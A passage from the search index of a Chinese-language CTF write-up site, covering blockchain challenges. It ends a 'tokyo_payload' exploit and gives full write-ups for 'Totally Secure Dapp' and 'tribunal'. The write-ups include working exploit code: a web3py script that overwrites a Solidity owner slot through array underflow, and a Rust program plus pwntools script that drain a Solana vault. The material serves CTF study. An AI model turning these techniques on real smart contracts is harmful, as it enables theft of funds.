memory data = vm . ffi ( inputs ); ( bool s , ) = address ( tokyoPayload ). call ( data ); require ( s ); require ( tokyoPayload . solved ()); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import sys def place ( offset , value : int ): global data if l := len ( data ) // 2 < offset : data += '00' * ( offset - l + 0x20 ) data = data [: offset * 2 ] + f ' { value : 064x } ' + data [( offset + 0x20 ) * 2 :] target_addr = int ( sys . argv [ 1 ], 16 ) data = '000040c3' # sig data += f ' { 0x7b : 064x } ' # x data += f ' { 0x153 : 064x } ' # y place ( 0x4 + 0x153 * 0x20 + 1 , 0x17f ) # funcs[0x153] = 0x17f place ( 0x20 * 0x18f + 0x20 + 0x153 - 0x7b , 0xd0 ) # MEM[0x20 * 0x18f + 0x20 + y] = 0xd0 place ( 0x60 + 0x20 , 0x7c ) # b: new_x place ( 0x60 + 0x40 , 0x1a3 ) # c: new_y place ( 0x4 + 0x1a3 * 0x20 , 0xd0 ) # funcs[0x1a3] = 0xd0 place ( 0x18f + 0x20 , 0x93 ) # b: STOP JUMPDEST place ( 0x18f + 0x40 , target_addr ) # c: DELEGATECALL target print ( data )","title":"Exploit"},{"location":"blockchain/tokyo_payload/#_3","text":"Layout in Memory \u2014 Solidity documentation Debugger - Foundry Book","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/totally_secure_dapp/","tags":["smart contract"],"text":"#smart contract .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 It's on the blockchain, and there's no way anything on the blockchain could ever have any vulnerabilities. Note, because the contract is on Ropsten, some transactions might fail. If that happens, just keep retrying. Get test ether from https://faucet.metamask.io/ https://totally-secure-dapp.vercel.app/ totally-secure-dapp.zip \u89e3\u9898\u601d\u8def \u00b6 https://totally-secure-dapp.vercel.app/ \u4e3b\u8981\u63d0\u4f9b\u4e86 New Post \u548c\u5c55\u793a Post \u7684\u529f\u80fd\uff0cPost \u8bb0\u5f55\u4e0a\u94fe \u63d0\u4f9b\u4e86\u4e24\u4efd\u5408\u7ea6\u4ee3\u7801\uff0cPost \u76f8\u5173\u64cd\u4f5c\u51fd\u6570\u4f4d\u4e8e TotallySecureDapp.sol \uff0c\u5f53\u8c03\u7528\u8005\u4e3a owner \u4e14\u5408\u7ea6\u8d26\u6237\u7684\u4f59\u989d\u5927\u4e8e 0.005 \u4ee5\u592a\u65f6\u53ef\u4ee5\u89e6\u53d1 FlagCaptured \u4e8b\u4ef6 1 2 3 4 5 6 7 8 9 10 modifier onlyOwner () { require ( msg . sender == _owner , 'Caller is not the owner' ); _ ; } function captureFlag () external onlyOwner { require ( address ( this ). balance > 0.005 ether , 'Balance too low' ); _flagCaptured = true ; emit FlagCaptured ( msg . sender ); } \u9664\u6b64\u4e4b\u5916\uff0c\u80fd\u591f\u8c03\u7528\u7684\u51fd\u6570\u6709 addPost \u3001 editPost \u3001 removePost \u548c nPost \u3002\u6ce8\u610f\u5230 removePost \u4e2d length \u7684\u51cf\u6cd5\u6ca1\u6709\u4f7f\u7528 SafeMath \u6216\u5728\u4f7f\u7528\u524d\u8fdb\u884c\u5224\u65ad 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 function addPost ( string title , string content ) external { Post memory post = Post ( title , content ); _posts . push ( post ); _authors . push ( msg . sender ); emit PostPublished ( msg . sender , _posts . length - 1 ); } function editPost ( uint256 index , string title , string content ) external { _authors [ index ] = msg . sender ; _posts [ index ] = Post ( title , content ); emit PostEdited ( msg . sender , index ); } function removePost ( uint256 index ) external { if ( int256 ( index ) < int256 ( _posts . length - 1 )) { for ( uint256 i = index ; i < _posts . length - 1 ; i ++ ) { _posts [ i ] = _posts [ i + 1 ]; _authors [ i ] = _authors [ i + 1 ]; } } _posts . length -- ; _authors . length -- ; emit PostRemoved ( msg . sender , index ); } function nPosts () public view returns ( uint256 ) { return _posts . length ; } \u56e0\u4e3a\u6570\u7ec4\u957f\u5ea6\u53ef\u63a7\u4e14\u53ef\u7f16\u8f91\u6307\u5b9a\u4e0b\u6807\u7684\u6570\u7ec4\u5143\u7d20\uff0c\u63a5\u4e0b\u6765\u53ea\u9700\u8981\u901a\u8fc7 editPost \u8986\u76d6 owner \u53d8\u91cf string \u7c7b\u578b\u7684\u53d8\u91cf\u5b58\u50a8\u65b9\u5f0f\u4e0e address \u7c7b\u578b\u7684\u4e0d\u540c\uff0c\u5f53\u957f\u5ea6\u5c0f\u4e8e \\(32\\) \u5b57\u8282\u65f6\uff0c\u5143\u7d20\u5b58\u50a8\u5728\u9ad8\u4f4d\uff0c\u4f4e\u4f4d\u5b58\u50a8\u5b57\u7b26\u4e32\u5b57\u8282\u957f\u5ea6\uff0c\u5f53\u957f\u5ea6\u5927\u4e8e \\(31\\) \u5b57\u8282\u65f6\uff0c\u5b58\u50a8\u65b9\u5f0f\u4e0e\u6570\u7ec4\u7c7b\u4f3c \u5efa\u8bae\u901a\u8fc7 _authors \u6570\u7ec4\u5b8c\u6210\u8986\u76d6\u64cd\u4f5c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // contract Initializable bool private _initialized ; // slot 0 bool private _initializing ; // slot 0 // contract TotallySecureDapp is Initializable struct Post { string title ; string content ; } // 2 slots string public _contractId ; // slot 1 address public _owner ; // slot 2 address [] public _authors ; // slot 3 Post [] public _posts ; // slot 4 bool public _flagCaptured ; // slot 5 \u53e6\u5916\uff0c\u5408\u7ea6 TotallySecureDapp \u4e0d\u63a5\u53d7\u76f4\u63a5\u8f6c\u8d26\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u4e9b\u7279\u6b8a\u624b\u6bb5 >v< \u6bd4\u5982 selfdestruct 1 2 3 function () external payable { revert ( 'Contract does not accept payments' ); } \u7ed9 TotallySecureDapp \u5408\u7ea6\u5b9e\u4f8b\u8f6c\u8d26\u540e\uff0c\u901a\u8fc7 web3py \u4e0e\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 from web3 import Web3 import json , time # \u5728 https://infura.io/ \u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u5e76\u521b\u5efa\u4e00\u4e2a\u9879\u76ee\u53ef\u83b7\u5f97 API key w3 = Web3 ( Web3 . HTTPProvider ( \"https://ropsten.infura.io/v3/<api-key>\" )) account = w3 . eth . account . from_key ( \"<your-private-key>\" ) contract_address = \"<totallysecuredapp-instance-address>\" abi = json . loads ( open ( 'abi.json' ) . read ()) contract = w3 . eth . contract ( address = contract_address , abi = abi ) # \u5148\u8c03\u7528 removePost \u4f7f\u6570\u7ec4\u957f\u5ea6\u4e0b\u6ea2\u51fa tx = contract . functions . removePost ( 1 ) . buildTransaction ({ \"from\" : account . address , \"nonce\" : w3 . eth . getTransactionCount ( account . address )}) signed_tx = account . signTransaction ( tx ) print ( w3 . eth . sendRawTransaction ( signed_tx . rawTransaction ) . hex ()) time . sleep ( 30 ) # \u7b49\u5f85\u4ea4\u6613\u786e\u8ba4 # \u4fee\u6539 owner index = 2 ** 256 - int ( Web3 . soliditySha3 ([ 'uint256' ], [ 3 ]) . hex (), 16 ) + 2 tx = contract . functions . editPost ( index , \"unimportant\" , \"unimportant\" ) . buildTransaction ({ \"from\" : account . address , \"nonce\" : w3 . eth . getTransactionCount ( account . address )}) signed_tx = account . signTransaction ( tx ) print ( w3 . eth . sendRawTransaction ( signed_tx . rawTransaction ) . hex ()) time . sleep ( 30 ) # emit FlagCaptured tx = contract . functions . captureFlag () . buildTransaction ({ \"from\" : account . address , \"nonce\" : w3 . eth . getTransactionCount ( account . address )}) signed_tx = account . signTransaction ( tx ) print ( w3 . eth . sendRawTransaction ( signed_tx . rawTransaction ) . hex ()) TotallySecureDapp | Address 0x014a2a17aa06c26c660fb4a269ac87849d38fd0a | Etherscan \u53ef\u4ee5\u770b\u5230 FlagCaptured \u4e8b\u4ef6\u88ab\u6210\u529f\u89e6\u53d1\u4e86\uff0c\u4f46\u662f Flag \u5728\u54ea\uff1f \u8d77\u521d\u4ee5\u4e3a\u662f\u4e8b\u4ef6\u7684\u8fd4\u56de\u503c\uff0c\u4f46\u67e5\u65e5\u5fd7\u4e5f\u6700\u591a\u53ea\u80fd\u83b7\u5f97\u4f20\u53c2\u3002\u60f3\u5230\u662f Web \u9898\uff0c\u8dd1\u53bb\u7ffb\u4e86\u7ffb\u6e90\u7801\uff0c\u53d1\u73b0 pages/api/secret.ts \u4e2d\u63d0\u4f9b\u4e86\u83b7\u53d6 Flag \u7684\u63a5\u53e3\uff0c\u8bf7\u6c42\u53c2\u6570\u5305\u62ec userAddress \u3001 contractAddress \u4ee5\u53ca userId 1 const { userAddress , contractAddress , userId } = req . body as ReqData ; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const owner = await contract . _owner (); const flagCaptured = await contract . _flagCaptured (); const balance = await provider . getBalance ( contractAddress ); if ( owner === userAddress && flagCaptured && balance . gt ( parseEther ( '0.005' ))) { const ids = db . collection ( 'users' ). doc ( 'ids' ); if ( ! ids ) { res . status ( 500 ). json ({ error : 'Failed to load ids' }); return ; } const id = ( await ids . get ()). get ( userAddress . toLowerCase ()); if ( id !== userId ) { res . status ( 401 ). json ({ error : 'Unauthorised' }); return ; } const flag = process . env . FLAG ; res . status ( 200 ). json ({ flag : flag }); return ; } \u5408\u7ea6\u76f8\u5173\u7684\u6761\u4ef6\u90fd\u5df2\u6ee1\u8db3\uff0c\u8fd8\u5dee\u4e00\u4e2a userId \uff0c\u641c\u4e86\u641c\u6e90\u7801\uff0c\u5728 components/connector/ConnectModal.tsx \u4e0b\u627e\u5230\u4e86 1 window . localStorage . setItem ( 'user-id' , id ); \u5728\u63a7\u5236\u53f0\u8f93\u5165 localStorage.getItem('user-id') \u5373\u53ef\u83b7\u5f97\u5bf9\u5e94\u8d26\u6237\u7684 userId \u8c03\u7528 API \u63a5\u53e3 1 2 $ curl -d '{\"userAddress\":\"0xe09f6d20E2522F6B971b4516744946CF17BE8432\", \"contractAddress\":\"0x014A2a17AA06C26C660FB4A269aC87849d38Fd0A\", \"userId\": \"RIHIaESfxzilmF10mmBpH\"}' -H \"Content-Type: application/json\" -X POST https://totally-secure-dapp.vercel.app/api/secret { \"flag\" : \"UACTF{23411y_m394_5u5_f149}\" } Flag \u00b6 UACTF{23411y_m394_5u5_f149}","title":"Totally Secure Dapp"},{"location":"blockchain/totally_secure_dapp/#_1","text":"It's on the blockchain, and there's no way anything on the blockchain could ever have any vulnerabilities. Note, because the contract is on Ropsten, some transactions might fail. If that happens, just keep retrying. Get test ether from https://faucet.metamask.io/ https://totally-secure-dapp.vercel.app/ totally-secure-dapp.zip","title":"\u9898\u76ee"},{"location":"blockchain/totally_secure_dapp/#_2","text":"https://totally-secure-dapp.vercel.app/ \u4e3b\u8981\u63d0\u4f9b\u4e86 New Post \u548c\u5c55\u793a Post \u7684\u529f\u80fd\uff0cPost \u8bb0\u5f55\u4e0a\u94fe \u63d0\u4f9b\u4e86\u4e24\u4efd\u5408\u7ea6\u4ee3\u7801\uff0cPost \u76f8\u5173\u64cd\u4f5c\u51fd\u6570\u4f4d\u4e8e TotallySecureDapp.sol \uff0c\u5f53\u8c03\u7528\u8005\u4e3a owner \u4e14\u5408\u7ea6\u8d26\u6237\u7684\u4f59\u989d\u5927\u4e8e 0.005 \u4ee5\u592a\u65f6\u53ef\u4ee5\u89e6\u53d1 FlagCaptured \u4e8b\u4ef6 1 2 3 4 5 6 7 8 9 10 modifier onlyOwner () { require ( msg . sender == _owner , 'Caller is not the owner' ); _ ; } function captureFlag () external onlyOwner { require ( address ( this ). balance > 0.005 ether , 'Balance too low' ); _flagCaptured = true ; emit FlagCaptured ( msg . sender ); } \u9664\u6b64\u4e4b\u5916\uff0c\u80fd\u591f\u8c03\u7528\u7684\u51fd\u6570\u6709 addPost \u3001 editPost \u3001 removePost \u548c nPost \u3002\u6ce8\u610f\u5230 removePost \u4e2d length \u7684\u51cf\u6cd5\u6ca1\u6709\u4f7f\u7528 SafeMath \u6216\u5728\u4f7f\u7528\u524d\u8fdb\u884c\u5224\u65ad 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 function addPost ( string title , string content ) external { Post memory post = Post ( title , content ); _posts . push ( post ); _authors . push ( msg . sender ); emit PostPublished ( msg . sender , _posts . length - 1 ); } function editPost ( uint256 index , string title , string content ) external { _authors [ index ] = msg . sender ; _posts [ index ] = Post ( title , content ); emit PostEdited ( msg . sender , index ); } function removePost ( uint256 index ) external { if ( int256 ( index ) < int256 ( _posts . length - 1 )) { for ( uint256 i = index ; i < _posts . length - 1 ; i ++ ) { _posts [ i ] = _posts [ i + 1 ]; _authors [ i ] = _authors [ i + 1 ]; } } _posts . length -- ; _authors . length -- ; emit PostRemoved ( msg . sender , index ); } function nPosts () public view returns ( uint256 ) { return _posts . length ; } \u56e0\u4e3a\u6570\u7ec4\u957f\u5ea6\u53ef\u63a7\u4e14\u53ef\u7f16\u8f91\u6307\u5b9a\u4e0b\u6807\u7684\u6570\u7ec4\u5143\u7d20\uff0c\u63a5\u4e0b\u6765\u53ea\u9700\u8981\u901a\u8fc7 editPost \u8986\u76d6 owner \u53d8\u91cf string \u7c7b\u578b\u7684\u53d8\u91cf\u5b58\u50a8\u65b9\u5f0f\u4e0e address \u7c7b\u578b\u7684\u4e0d\u540c\uff0c\u5f53\u957f\u5ea6\u5c0f\u4e8e \\(32\\) \u5b57\u8282\u65f6\uff0c\u5143\u7d20\u5b58\u50a8\u5728\u9ad8\u4f4d\uff0c\u4f4e\u4f4d\u5b58\u50a8\u5b57\u7b26\u4e32\u5b57\u8282\u957f\u5ea6\uff0c\u5f53\u957f\u5ea6\u5927\u4e8e \\(31\\) \u5b57\u8282\u65f6\uff0c\u5b58\u50a8\u65b9\u5f0f\u4e0e\u6570\u7ec4\u7c7b\u4f3c \u5efa\u8bae\u901a\u8fc7 _authors \u6570\u7ec4\u5b8c\u6210\u8986\u76d6\u64cd\u4f5c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // contract Initializable bool private _initialized ; // slot 0 bool private _initializing ; // slot 0 // contract TotallySecureDapp is Initializable struct Post { string title ; string content ; } // 2 slots string public _contractId ; // slot 1 address public _owner ; // slot 2 address [] public _authors ; // slot 3 Post [] public _posts ; // slot 4 bool public _flagCaptured ; // slot 5 \u53e6\u5916\uff0c\u5408\u7ea6 TotallySecureDapp \u4e0d\u63a5\u53d7\u76f4\u63a5\u8f6c\u8d26\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u4e9b\u7279\u6b8a\u624b\u6bb5 >v< \u6bd4\u5982 selfdestruct 1 2 3 function () external payable { revert ( 'Contract does not accept payments' ); } \u7ed9 TotallySecureDapp \u5408\u7ea6\u5b9e\u4f8b\u8f6c\u8d26\u540e\uff0c\u901a\u8fc7 web3py \u4e0e\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 from web3 import Web3 import json , time # \u5728 https://infura.io/ \u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u5e76\u521b\u5efa\u4e00\u4e2a\u9879\u76ee\u53ef\u83b7\u5f97 API key w3 = Web3 ( Web3 . HTTPProvider ( \"https://ropsten.infura.io/v3/<api-key>\" )) account = w3 . eth . account . from_key ( \"<your-private-key>\" ) contract_address = \"<totallysecuredapp-instance-address>\" abi = json . loads ( open ( 'abi.json' ) . read ()) contract = w3 . eth . contract ( address = contract_address , abi = abi ) # \u5148\u8c03\u7528 removePost \u4f7f\u6570\u7ec4\u957f\u5ea6\u4e0b\u6ea2\u51fa tx = contract . functions . removePost ( 1 ) . buildTransaction ({ \"from\" : account . address , \"nonce\" : w3 . eth . getTransactionCount ( account . address )}) signed_tx = account . signTransaction ( tx ) print ( w3 . eth . sendRawTransaction ( signed_tx . rawTransaction ) . hex ()) time . sleep ( 30 ) # \u7b49\u5f85\u4ea4\u6613\u786e\u8ba4 # \u4fee\u6539 owner index = 2 ** 256 - int ( Web3 . soliditySha3 ([ 'uint256' ], [ 3 ]) . hex (), 16 ) + 2 tx = contract . functions . editPost ( index , \"unimportant\" , \"unimportant\" ) . buildTransaction ({ \"from\" : account . address , \"nonce\" : w3 . eth . getTransactionCount ( account . address )}) signed_tx = account . signTransaction ( tx ) print ( w3 . eth . sendRawTransaction ( signed_tx . rawTransaction ) . hex ()) time . sleep ( 30 ) # emit FlagCaptured tx = contract . functions . captureFlag () . buildTransaction ({ \"from\" : account . address , \"nonce\" : w3 . eth . getTransactionCount ( account . address )}) signed_tx = account . signTransaction ( tx ) print ( w3 . eth . sendRawTransaction ( signed_tx . rawTransaction ) . hex ()) TotallySecureDapp | Address 0x014a2a17aa06c26c660fb4a269ac87849d38fd0a | Etherscan \u53ef\u4ee5\u770b\u5230 FlagCaptured \u4e8b\u4ef6\u88ab\u6210\u529f\u89e6\u53d1\u4e86\uff0c\u4f46\u662f Flag \u5728\u54ea\uff1f \u8d77\u521d\u4ee5\u4e3a\u662f\u4e8b\u4ef6\u7684\u8fd4\u56de\u503c\uff0c\u4f46\u67e5\u65e5\u5fd7\u4e5f\u6700\u591a\u53ea\u80fd\u83b7\u5f97\u4f20\u53c2\u3002\u60f3\u5230\u662f Web \u9898\uff0c\u8dd1\u53bb\u7ffb\u4e86\u7ffb\u6e90\u7801\uff0c\u53d1\u73b0 pages/api/secret.ts \u4e2d\u63d0\u4f9b\u4e86\u83b7\u53d6 Flag \u7684\u63a5\u53e3\uff0c\u8bf7\u6c42\u53c2\u6570\u5305\u62ec userAddress \u3001 contractAddress \u4ee5\u53ca userId 1 const { userAddress , contractAddress , userId } = req . body as ReqData ; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const owner = await contract . _owner (); const flagCaptured = await contract . _flagCaptured (); const balance = await provider . getBalance ( contractAddress ); if ( owner === userAddress && flagCaptured && balance . gt ( parseEther ( '0.005' ))) { const ids = db . collection ( 'users' ). doc ( 'ids' ); if ( ! ids ) { res . status ( 500 ). json ({ error : 'Failed to load ids' }); return ; } const id = ( await ids . get ()). get ( userAddress . toLowerCase ()); if ( id !== userId ) { res . status ( 401 ). json ({ error : 'Unauthorised' }); return ; } const flag = process . env . FLAG ; res . status ( 200 ). json ({ flag : flag }); return ; } \u5408\u7ea6\u76f8\u5173\u7684\u6761\u4ef6\u90fd\u5df2\u6ee1\u8db3\uff0c\u8fd8\u5dee\u4e00\u4e2a userId \uff0c\u641c\u4e86\u641c\u6e90\u7801\uff0c\u5728 components/connector/ConnectModal.tsx \u4e0b\u627e\u5230\u4e86 1 window . localStorage . setItem ( 'user-id' , id ); \u5728\u63a7\u5236\u53f0\u8f93\u5165 localStorage.getItem('user-id') \u5373\u53ef\u83b7\u5f97\u5bf9\u5e94\u8d26\u6237\u7684 userId \u8c03\u7528 API \u63a5\u53e3 1 2 $ curl -d '{\"userAddress\":\"0xe09f6d20E2522F6B971b4516744946CF17BE8432\", \"contractAddress\":\"0x014A2a17AA06C26C660FB4A269aC87849d38Fd0A\", \"userId\": \"RIHIaESfxzilmF10mmBpH\"}' -H \"Content-Type: application/json\" -X POST https://totally-secure-dapp.vercel.app/api/secret { \"flag\" : \"UACTF{23411y_m394_5u5_f149}\" }","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/totally_secure_dapp/#flag","text":"UACTF{23411y_m394_5u5_f149}","title":"Flag"},{"location":"blockchain/tribunal/","tags":["solana","integer underflow"],"text":"#solana #integer underflow .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 The yearly CoR tribunal is upon us, and issues vital to the long-term survival of our CTF team are being discussed. I learned from my mistakes last year, so now this smart contract is much more secure! nc be.ax 30555 tribunal.tar.gz \u89e3\u9898\u601d\u8def \u00b6 user \u521d\u59cb\u6301\u6709 1 SOL 1 2 3 4 // fund user chall . run_ix ( system_instruction :: transfer ( & payer , & user , 1 _000_000_000 )) // 1 sol . await ? ; \u76ee\u6807\u662f\u83b7\u53d6\u81f3\u5c11 90 SOL 1 2 3 4 5 6 7 8 9 // 90 sol if account . lamports > 90_000_000_000 { writeln! ( socket , \"you'll be the focus of the next tribunal...\" ) ? ; writeln! ( socket , \"flag: {}\" , env :: var ( \"FLAG\" ). unwrap_or_else ( | _ | \"corctf{test_flag}\" . to_string ()) ) ? ; } \u7a0b\u5e8f\u652f\u6301\u7684\u56db\u79cd\u6307\u4ee4\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7 Withdraw \u83b7\u53d6 SOL\uff0c\u9700\u8981\u4fdd\u8bc1 config_data.total_balance \u4ee5\u53ca vault \u7684\u4f59\u989d\u5927\u4e8e amount 1 2 3 4 5 6 7 #[derive(BorshDeserialize, BorshSerialize)] pub enum TribunalInstruction { Initialize { config_bump : u8 , vault_bump : u8 }, Propose { proposal_id : u8 , proposal_bump : u8 }, Vote { proposal_id : u8 , amount : u64 }, Withdraw { amount : u64 }, } \u7a0b\u5e8f\u53ea\u68c0\u67e5\u7528\u6237\u63d0\u4f9b\u7684 vault \u8d26\u6237\u662f\u5426\u662f Vault \u7c7b\u578b\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528 admin \u521b\u5efa\u7684 vault 1 2 3 if vault_data . discriminator != Types :: Vault { return Err ( ProgramError :: InvalidAccountData ); } \u7531\u4e8e\u7a0b\u5e8f\u4f1a\u68c0\u67e5 config \u8d26\u6237\u7684 admin\uff0c\u56e0\u6b64 config \u8d26\u6237\u53ea\u80fd\u4f7f\u7528\u7528\u6237\u901a\u8fc7 Initialize \u521b\u5efa\u7684\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u4fee\u6539 total_balance \uff0c\u800c total_balance \u53ea\u80fd\u901a\u8fc7 Vote \u4fee\u6539 \u6ce8\u610f\u5230\u5728\u66f4\u65b0 total_balance \u65f6\uff0c -100 \u6ca1\u6709\u4f7f\u7528 checked_sub \uff0c\u56e0\u800c\u53ef\u901a\u8fc7\u4e0b\u6ea2\u51fa\u5f97\u5230\u5145\u8db3\u7684 total_balance 1 2 // update the config total balance config_data . total_balance = config_data . total_balance . checked_add ( lamports ). unwrap () - 100 ; // keep some for rent Exploitation \u00b6 1 2 3 4 5 $ cargo new solve $ cd solve/ $ mv src/main.rs src/lib.rs $ cargo add solana_program borsh $ cargo-build-bpf Cargo.toml 1 2 3 4 5 6 7 8 9 10 11 [package] name = \"solve\" version = \"0.1.0\" edition = \"2021\" [dependencies] borsh = \"0.10.3\" solana-program = \"1.16.5\" [lib] crate-type = [\"cdylib\", \"rlib\"] lib.rs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 use borsh ::{ BorshSerialize }; use solana_program ::{ account_info ::{ next_account_info , AccountInfo }, instruction ::{ AccountMeta , Instruction }, entrypoint :: ProgramResult , entrypoint , program :: invoke , pubkey :: Pubkey , system_program , }; #[derive(BorshSerialize)] pub enum TribunalInstruction { Initialize { config_bump : u8 , vault_bump : u8 }, Propose { proposal_id : u8 , proposal_bump : u8 }, Vote { proposal_id : u8 , amount : u64 }, Withdraw { amount : u64 }, } entrypoint ! ( process_instruction ); pub fn process_instruction ( _program_id : & Pubkey , accounts : & [ AccountInfo ], _instruction_data : & [ u8 ], ) -> ProgramResult { let iter = & mut accounts . iter (); let chall_id = next_account_info ( iter ) ? ; let user = next_account_info ( iter ) ? ; let user_config = next_account_info ( iter ) ? ; let user_vault = next_account_info ( iter ) ? ; let proposal = next_account_info ( iter ) ? ; let vault = next_account_info ( iter ) ? ; let config_bump = 252_ u8 ; let vault_bump = 253_ u8 ; invoke ( & Instruction { program_id : * chall_id . key , data : TribunalInstruction :: Initialize { config_bump , vault_bump }. try_to_vec (). unwrap (), accounts : vec ! [ AccountMeta :: new ( * user . key , true ), AccountMeta :: new ( * user_config . key , false ), AccountMeta :: new ( * user_vault . key , false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ] }, & [ user . clone (), user_config . clone (), // all accounts should be provided user_vault . clone (), ] ) ? ; invoke ( & Instruction { program_id : * chall_id . key , data : TribunalInstruction :: Vote { proposal_id : 1 , amount : 1 }. try_to_vec (). unwrap (), accounts : vec ! [ AccountMeta :: new ( * user . key , true ), AccountMeta :: new ( * user_config . key , false ), AccountMeta :: new ( * vault . key , false ), AccountMeta :: new ( * proposal . key , false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ] }, & [ user . clone (), vault . clone (), user_config . clone (), proposal . clone (), ] ) ? ; invoke ( & Instruction { program_id : * chall_id . key , data : TribunalInstruction :: Withdraw { amount : 95_000_000_000 }. try_to_vec (). unwrap (), accounts : vec ! [ AccountMeta :: new ( * user . key , true ), AccountMeta :: new ( * user_config . key , false ), AccountMeta :: new ( * vault . key , false ), AccountMeta :: new_readonly ( system_program :: id (), false ), ] }, & [ user . clone (), vault . clone (), user_config . clone (), ] ) ? ; Ok (()) } solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 from pwn import * from solana.publickey import PublicKey from solana.system_program import SYS_PROGRAM_ID account_metas = [ ( \"program\" , \"-r\" ), # readonly ( \"user\" , \"sw\" ), # signer + writable ( \"user_config\" , \"-w\" ), ( \"user_vault\" , \"-w\" ), ( \"proposal\" , \"-w\" ), ( \"vault\" , \"-w\" ), ( \"system program\" , \"-r\" ), ] instruction_data = b \"\" p = remote ( \"be.ax\" , 30555 ) with open ( \"solve/target/deploy/solve.so\" , \"rb\" ) as f : solve = f . read () p . sendlineafter ( b \"program pubkey: \\n \" , str ( PublicKey ( b '1' * 32 )) . encode ()) p . sendlineafter ( b \"program len: \\n \" , str ( len ( solve )) . encode ()) p . send ( solve ) accounts = {} accounts [ \"program\" ] = p . recvline_contains ( b \"program: \" ) . strip () . split ( b \": \" )[ - 1 ] . decode () accounts [ \"user\" ] = p . recvline_contains ( b \"user: \" ) . strip () . split ( b \": \" )[ - 1 ] . decode () accounts [ \"system program\" ] = SYS_PROGRAM_ID . to_base58 () . decode () program_id = PublicKey ( accounts [ \"program\" ]) config_addr = PublicKey . create_program_address ([ b \"CONFIG\" , b ' \\xfc ' ], program_id ) # use a different bump seed from admin accounts [ \"user_config\" ] = config_addr . to_base58 () . decode () vault_addr = PublicKey . create_program_address ([ b \"VAULT\" , b ' \\xfd ' ], program_id ) accounts [ \"user_vault\" ] = vault_addr . to_base58 () . decode () vault_addr , vault_bump = PublicKey . find_program_address ([ b \"VAULT\" ], program_id ) accounts [ \"vault\" ] = vault_addr . to_base58 () . decode () # admin vault proposal_addr , proposal_bump = PublicKey . find_program_address ([ b \"PROPOSAL\" , b \" \\x01 \" ], program_id ) accounts [ \"proposal\" ] = proposal_addr . to_base58 () . decode () p . recvuntil ( b \"num accounts: \\n \" , drop = True ) p . sendline ( str ( len ( account_metas )) . encode ()) for ( name , perms ) in account_metas : p . sendline ( f \" { perms } { accounts [ name ] } \" . encode ()) p . sendlineafter ( b \"ix len: \\n \" , str ( len ( instruction_data )) . encode ()) p . send ( instruction_data ) p . interactive () Flag \u00b6 corctf{its_y0ur_time_to_f4ce_the_CoR_tribunal} \u53c2\u8003\u8d44\u6599 \u00b6 anchor - how to convert pubkey to accountinfo? - Solana Stack Exchange Pubkey \u2014 solders documentation","title":"tribunal"},{"location":"blockchain/tribunal/#_1","text":"The yearly CoR tribunal is upon us, and issues vital to the long-term survival of our CTF team are being discussed. I learned from my mistakes last year, so now this smart contract is much more secure! nc be.ax 30555 tribunal.tar.gz","title":"\u9898\u76ee"},{"location":"blockchain/tribunal/#_2","text":"user \u521d\u59cb\u6301\u6709 1 SOL 1 2 3 4 // fund user chall . run_ix ( system_instruction :: transfer ( & payer , & user , 1 _000_000_000 )) // 1 sol . await ? ; \u76ee\u6807\u662f\u83b7\u53d6\u81f3\u5c11 90 SOL 1 2 3 4 5 6 7 8 9 // 90 sol if account . lamports > 90_000_000_000 { writeln! ( socket , \"you'll be the focus of the next tribunal...\" ) ? ; writeln! ( socket , \"flag: {}\" , env :: var ( \"FLAG\" ). unwrap_or_else ( | _ | \"corctf{test_flag}\" . to_string ()) ) ? ; } \u7a0b\u5e8f\u652f\u6301\u7684\u56db\u79cd\u6307\u4ee4\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7 Withdraw \u83b7\u53d6 SOL\uff0c\u9700\u8981\u4fdd\u8bc1 config_data.total_balance \u4ee5\u53ca vault \u7684\u4f59\u989d\u5927\u4e8e amount 1 2 3 4 5 6 7 #[derive(BorshDeserialize, BorshSerialize)] pub enum TribunalInstruction { Initialize { config_bump : u8 , vault_bump : u8 